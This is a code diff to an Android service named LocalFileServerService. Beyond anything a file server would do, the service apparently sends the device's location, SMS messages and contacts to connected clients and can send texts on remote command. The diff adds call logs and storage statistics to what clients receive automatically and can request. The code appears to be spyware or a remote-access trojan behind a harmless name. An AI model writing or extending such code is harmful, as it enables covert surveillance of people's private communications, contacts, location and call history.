@@ -188,6 +188,8 @@ class LocalFileServerService : Service() {
             broadcastMessage(teleManager.getLocation().put("type", "LOCATION").toString())
             broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
             broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
+            broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
+            broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
         } catch (e: Exception) { e.printStackTrace() }
     }
 
@@ -282,6 +284,8 @@ class LocalFileServerService : Service() {
             "FETCH_LOCATION" -> broadcastMessage(teleManager.getLocation().put("type", "LOCATION").toString())
             "FETCH_SMS" -> broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
             "FETCH_CONTACTS" -> broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
+            "FETCH_STORAGE" -> broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
+            "FETCH_CALL_LOGS" -> broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
             "SEND_SMS" -> {
                 val success = teleManager.sendSms(json.getString("to"), json.getString("message"))
                 broadcastMessage("{\"type\":\"SMS_SENT\",\"success\":$success}")
